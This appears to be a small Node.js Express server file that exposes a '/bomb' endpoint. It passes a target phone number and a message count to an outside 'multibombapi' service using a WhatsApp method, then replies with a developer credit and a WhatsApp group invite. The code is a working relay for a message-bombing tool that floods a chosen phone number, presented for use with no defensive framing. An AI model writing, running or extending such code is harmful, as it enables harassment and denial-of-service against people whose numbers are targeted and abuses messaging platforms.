const express = require('express');
const axios = require('axios');
const app = express();

const PORT = process.env.PORT || 3000;

app.get('/bomb', (req, res) => {
    const { number, count } = req.query;

    if (!number) {
        return res.status(400).send("Error: 'number' parameter is required.");
    }

    // Dynamic count: Jo count user bhejega wohi pass hoga, warna default 1
    const finalCount = count !== undefined ? count : 1;

    // Main API Target URL with dynamic number and count
    const targetUrl = `https://multibombapi-taupe.vercel.app/bomb?number=${encodeURIComponent(number)}&count=${encodeURIComponent(finalCount)}&method=whatsapp`;

    // Background call trigger (instant response ke sath)
    axios.get(targetUrl)
        .then(() => {
            console.log(`Success: Background task started for ${number} with count ${finalCount}`);
        })
        .catch((err) => {
            console.error("Error in background call:", err.message);
        });

    // Aapka custom response message
    return res.status(200).send("work start in bacground developed by Ramzan Ahsan or join group https://chat.whatsapp.com/FiZBn0BykHX47d1iHLOay1");
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
